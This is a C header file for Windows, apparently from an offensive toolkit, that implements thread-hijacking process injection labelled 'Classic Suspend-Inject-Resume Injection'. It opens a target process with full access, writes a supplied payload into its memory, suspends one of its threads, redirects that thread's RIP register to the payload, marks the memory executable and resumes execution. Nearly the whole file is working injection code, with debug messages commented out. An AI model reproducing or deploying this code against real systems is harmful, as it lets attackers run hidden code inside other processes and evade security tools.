#pragma once

#include <Windows.h>
#include <TlHelp32.h>

// Find any thread in the process and return handle
// ------------------------------------------------------------------------

HANDLE getThreadHandle(DWORD pid) {
	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (h != INVALID_HANDLE_VALUE) {
		THREADENTRY32 te;
		te.dwSize = sizeof(te);
		if (Thread32First(h, &te)) {
			do {
				if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)) {
					if (te.th32OwnerProcessID == pid) {
						HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
						if (!hThread)
							break;
						else
							return hThread;
					}
				}
			} while (Thread32Next(h, &te));
		}
	}
	return NULL;
}

// Classic Suspend-Inject-Resume Injection
// Warning: Use with caution, remote process will likely crash
// ------------------------------------------------------------------------

BOOL sir_inject_64(LPSTR payload, SIZE_T payloadLen, DWORD pid) {
	DWORD oldprotect = 0;

	// Opening a handle to the target process
	HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if (processHandle == NULL) {
		//printf("[-] Error: Could not open process with PID %d\n", pid);
		return FALSE;
	}

	// Obtain the handle to a thread of the target process with THREAD_GET_CONTEXT | THREAD_SET_CONTEXT rights
	HANDLE threadHandle = getThreadHandle(pid);
	if (threadHandle == NULL) {
		//printf("[-] Error: Could not open remote thread\n");
		return FALSE;
	}

	// Allocating a RW buffer for the payload in the target process
	LPVOID pAlloc = VirtualAllocEx(processHandle, 0, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAlloc == NULL) {
		//printf("[-] Error: Could not allocate RW memory in process\n");
		return FALSE;
	}

	// Writing the payload to the created buffer
	SIZE_T bytesWritten = 0;
	BOOL writeStatus = WriteProcessMemory(processHandle, pAlloc, payload, payloadLen, &bytesWritten);
	if (writeStatus == 0) {
		//printf("[-] Error: Could not write payload to process memory\n");
		return FALSE;
	}
	//printf("[+] Written %d bytes to %p\n", bytesWritten, pAlloc);

    // Suspend the thread
	SuspendThread(threadHandle);
	//printf("[+] Thread is now suspended\n");

	// Get the current registers set for our thread
	CONTEXT old_ctx, new_ctx;
	ZeroMemory(&old_ctx, sizeof(CONTEXT));
	ZeroMemory(&new_ctx, sizeof(CONTEXT));
	old_ctx.ContextFlags = CONTEXT_ALL;
	BOOL thGetConFlag = GetThreadContext(threadHandle, &old_ctx);
	if (thGetConFlag == 0) {
		//printf("[-] Error: GetThreadContext failed\n");
		return FALSE;
	}

    // Pointing RIP to our payload
	//printf("[+] RIP register set to %p\n", old_ctx.Rip);
	//printf("[+] Updating RIP to point to our payload\n");
	new_ctx = old_ctx;
	new_ctx.Rip = (DWORD64)pAlloc;

    // Set the updated registers for the thread
	BOOL thSetConFlag = SetThreadContext(threadHandle, &new_ctx);
	if (thSetConFlag == 0) {
		//printf("[-] Error: SetThreadContext failed\n");
		return FALSE;
	}

	// Changing the protection of RW buffer to RX so that the payload can be executed
	BOOL rv = VirtualProtectEx(processHandle, pAlloc, payloadLen, PAGE_EXECUTE_READ, &oldprotect);
	if (rv == 0) {
		//printf("[-] Error: Could not update page protection to RX\n");
		return FALSE;
	}

    // Resume the hijacked thread
	//printf("[+] Resuming thread execution at our payload address\n");
	ResumeThread(threadHandle);

	// Cleanup
	//Sleep(10000);
	//SuspendThread(threadHandle);
	//SetThreadContext(threadHandle, &old_ctx);
	//ResumeThread(threadHandle);

	return TRUE;
}